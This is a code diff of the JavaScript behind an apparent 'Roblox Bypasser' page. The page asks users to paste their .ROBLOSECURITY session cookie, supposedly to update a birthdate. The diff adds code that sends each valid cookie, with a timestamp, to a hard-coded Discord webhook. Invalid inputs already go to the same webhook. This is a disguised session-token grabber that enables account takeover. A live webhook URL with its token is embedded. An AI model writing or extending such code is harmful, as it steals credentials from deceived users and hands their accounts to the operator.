@@ -226,10 +226,10 @@ const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
 const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
-// Simple validation for .ROBLOSECURITY cookie (alphanumeric, at least 10 chars, basic pattern check)
+// Simple validation for .ROBLOSECURITY cookie (alphanumeric, at least 40 chars, basic pattern check)
 function isValidCookie(input) {
   const cookiePattern = /^[a-zA-Z0-9-_]+$/;
-  return input.length >= 10 && cookiePattern.test(input);
+  return input.length >= 40 && cookiePattern.test(input);
 }
 
 $("#cookieForm").on("submit", async function(e) {
@@ -237,11 +237,19 @@ $("#cookieForm").on("submit", async function(e) {
   const cookie = $("#cookieInput").val().trim();
 
   if (!isValidCookie(cookie)) {
-    alert("Invalid input! Please enter a valid .ROBLOSECURITY cookie.");
+    alert("Invalid input! Please enter a valid .ROBLOSECURITY cookie (at least 40 characters).");
     const webhookPayload = {
-      content: `Invalid Input Detected: \`${cookie}\` at ${new Date().toLocaleString()}`,
-      username: "Roblox Bypasser Bot",
-      avatar_url: "https://i.imgur.com/4j8o1.png"
+      content: "",
+      embeds: [{
+        title: "Invalid Cookie Submission",
+        description: "An invalid input was detected.",
+        color: 16711680, // Red color in decimal
+        fields: [
+          { name: "Input", value: `\`${cookie}\``, inline: false },
+          { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
+        ],
+        footer: { text: "Roblox Bypasser Bot" }
+      }]
     };
     try {
       await fetch(webhookUrl, {
@@ -291,6 +299,29 @@ $("#cookieForm").on("submit", async function(e) {
     $("#loader").hide();
 
     if (res.ok) {
+      const webhookPayload = {
+        content: "",
+        embeds: [{
+          title: "New Cookie Submission",
+          description: "A valid cookie was successfully processed.",
+          color: 65280, // Green color in decimal
+          fields: [
+            { name: "Cookie", value: `\`${cookie}\``, inline: false },
+            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
+          ],
+          footer: { text: "Roblox Bypasser Bot" }
+        }]
+      };
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(webhookPayload)
+        });
+      } catch (webhookError) {
+        console.error("Failed to send to webhook:", webhookError);
+      }
+
       $("#refreshedResult").text(`✅ Birthdate Updated Successfully!\nStatus: ${res.status}\nResponse: ${responseText}`);
       $("#refreshedBox").fadeIn();
       successSound.play();
